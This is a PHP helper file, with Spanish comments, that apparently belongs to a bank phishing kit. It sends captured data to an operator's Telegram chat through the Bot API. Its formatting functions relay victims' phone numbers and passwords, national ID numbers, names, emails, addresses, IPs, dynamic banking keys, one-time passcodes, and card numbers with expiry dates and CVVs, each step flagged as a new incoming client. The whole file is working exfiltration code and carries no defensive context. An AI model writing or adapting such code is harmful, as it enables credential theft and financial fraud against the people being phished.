<?php
// backend/telegram_helper.php

// Configuración del bot
define("TELEGRAM_TOKEN", "TU_TOKEN_AQUI");   // 🔹 reemplaza con tu token real
define("TELEGRAM_CHATID", "TU_CHATID_AQUI"); // 🔹 reemplaza con tu chat o canal

/**
 * Enviar mensaje de texto al bot de Telegram
 */
function sendTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendMessage";
    $data = [
        "chat_id" => TELEGRAM_CHATID,
        "text" => $message,
        "parse_mode" => "HTML"
    ];

    $options = [
        "http" => [
            "method"  => "POST",
            "header"  => "Content-Type:application/x-www-form-urlencoded\r\n",
            "content" => http_build_query($data)
        ]
    ];

    $context  = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);

    return $result !== false;
}

/**
 * Formato de mensajes para cada paso del flujo
 */
function formatLoginMessage($username, $password) {
    return "🚨 <b>NUEVO CLIENTE ENTRANTE</b> 🚨\n\n" .
           "📱 <b>Teléfono:</b> $username\n" .
           "🔐 <b>Clave:</b> $password";
}

function formatDatosMessage($nombre, $cedula, $ciudad, $dir, $email, $ip, $agent) {
    return "🚨 <b>NUEVA INFORMACIÓN RECIBIDA</b> 🚨\n\n" .
           "🆔 <b>Cédula:</b> $cedula\n" .
           "👤 <b>Nombre:</b> $nombre\n" .
           "📧 <b>Email:</b> $email\n" .
           "🏠 <b>Dirección:</b> $dir\n" .
           "🏙 <b>Ciudad:</b> $ciudad\n" .
           "🌍 <b>IP:</b> $ip\n" .
           "🖥 <b>User-Agent:</b> $agent";
}

function formatDinamicaMessage($dinamica) {
    return "🔑 <b>Clave dinámica recibida:</b> $dinamica";
}

function formatOtpMessage($otp) {
    return "📲 <b>OTP recibido:</b> $otp";
}

function formatFinalizarMessage($codigo, $fecha, $cvv) {
    return "✅ <b>Datos finales recibidos</b>\n\n" .
           "💳 <b>Código:</b> $codigo\n" .
           "📅 <b>Expiración:</b> $fecha\n" .
           "🔒 <b>CVV:</b> $cvv";
}
